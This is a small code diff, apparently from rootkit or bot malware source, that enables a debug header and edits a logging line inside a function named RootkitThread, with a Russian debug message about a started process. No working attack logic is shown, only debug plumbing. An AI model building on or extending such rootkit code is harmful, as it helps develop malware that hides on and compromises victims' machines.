@@ -22,7 +22,7 @@
 
 //---------------------------------------------------------------------------
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace ROOTKITDEBUGSTRINGS
 {
@@ -506,8 +506,8 @@ DWORD WINAPI RootkitThread(LPVOID)
 
 	Data.Application = AppName.t_str();
 	DWORD hashApp = File::GetNameHashA((PCHAR)AppName.t_str(), true);
-
-    RTKDBG("rotkit", "Запущен процесс %s", AppName.t_str());
+//	DWORD PID = GetUniquePID();
+	RTKDBG("rotkit", "Запущен процесс %s", AppName.t_str());
 
 	RootkitDoStartApplication(&Data, hashApp);
 
